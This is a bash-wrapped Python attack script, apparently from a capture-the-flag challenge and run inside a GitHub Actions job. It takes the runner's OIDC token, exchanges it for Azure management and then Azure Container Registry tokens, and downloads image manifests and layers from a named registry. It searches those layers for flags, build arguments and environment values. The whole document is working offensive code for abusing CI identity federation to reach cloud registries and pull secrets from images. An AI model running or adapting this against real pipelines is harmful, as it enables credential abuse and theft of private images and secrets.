#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, gzip, io, tarfile, urllib.request, urllib.parse, urllib.error

class NoAuthRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        n = urllib.request.Request(newurl, method="GET")
        return n
OPENER = urllib.request.build_opener(NoAuthRedirect)

def http(url, data=None, headers=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h)
    try:
        with OPENER.open(req, timeout=90) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]
REG="crtblplatprodx3euoz.azurecr.io"
FLAG=re.compile(rb"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\}|CTF\{[^}]{0,300}\})", re.I)
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://management.azure.com/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
ARM=jg(b)["access_token"]
st,b=http(f"https://{REG}/oauth2/exchange",{"grant_type":"access_token","service":REG,"tenant":TEN,"access_token":ARM})
RT=jg(b)["refresh_token"]
def tok(s):
    st,b=http(f"https://{REG}/oauth2/token",{"grant_type":"refresh_token","service":REG,"refresh_token":RT,"scope":s})
    return jg(b).get("access_token")
ACCEPT=("application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json,"
        "application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.index.v1+json,*/*")

TARGETS=[("tebamoto-reporting-api","sha256:3f0cdaee9d871e416e416ef4febf0cf8190bc54e8659988e856a338c407213dc"),
         ("catalog-api","sha256:558e99fdd79d07f2dfd39ed269b3cd898a06a9d991d3973fc233a47e2adb6c40"),
         ("tebamoto-reporting-api","sha256:44ac118b47775fcd7de2db939351ceb53a0481df08fb2f6f6b9f045823db80de"),
         ("catalog-api","sha256:18f1757dcb1a57cb784eb24f0279dc6c53dd8d16ed2a1d138449f62c90552982")]
seen=set()
for repo,dg in TARGETS:
    t=tok(f"repository:{repo}:*"); H={"Authorization":"Bearer "+t}
    st,b=http(f"https://{REG}/v2/{repo}/manifests/{dg}", headers=dict(H, Accept=ACCEPT))
    print(f"\n######## {repo} {dg[:20]} manifest HTTP {st}")
    man=jg(b)
    print("  ", json.dumps(man)[:1200])
    blobs=[]
    if man.get("config",{}).get("digest"): blobs.append(man["config"]["digest"])
    for l in man.get("layers",[]) or []: blobs.append(l["digest"])
    for m in man.get("manifests",[]) or []:
        st2,b2=http(f"https://{REG}/v2/{repo}/manifests/{m['digest']}", headers=dict(H, Accept=ACCEPT))
        sub=jg(b2)
        print(f"    sub {m['digest'][:18]} platform={m.get('platform')} ann={json.dumps(m.get('annotations',{}))[:150]}")
        if sub.get("config",{}).get("digest"): blobs.append(sub["config"]["digest"])
        for l in sub.get("layers",[]) or []: blobs.append(l["digest"])
    for bd in blobs:
        if (repo,bd) in seen: continue
        seen.add((repo,bd))
        st3,bb=http(f"https://{REG}/v2/{repo}/blobs/{bd}", headers=H)
        if st3!=200:
            print(f"    blob {bd[:18]} HTTP {st3}"); continue
        raw=bb
        try: raw=gzip.decompress(bb)
        except Exception: pass
        m2=FLAG.search(raw)
        print(f"    blob {bd[:18]} {len(bb)}b" + (f"   >>> FLAG: {m2.group(1).decode()}" if m2 else ""))
        if not m2 and len(raw)<8000:
            txt=raw.decode("utf-8","replace")
            if any(k in txt for k in ("predicate","SLSA","buildkit","build-arg","env","ARG")):
                print("       ", txt[:1500])
        if not m2:
            try:
                tf=tarfile.open(fileobj=io.BytesIO(raw))
                for mem in tf.getmembers():
                    if mem.isfile() and mem.size<300000:
                        d=tf.extractfile(mem).read()
                        mm=FLAG.search(d)
                        if mm: print(f"       >>> FLAG in {mem.name}: {mm.group(1).decode()}")
            except Exception: pass
PYEOF
echo "=== done ==="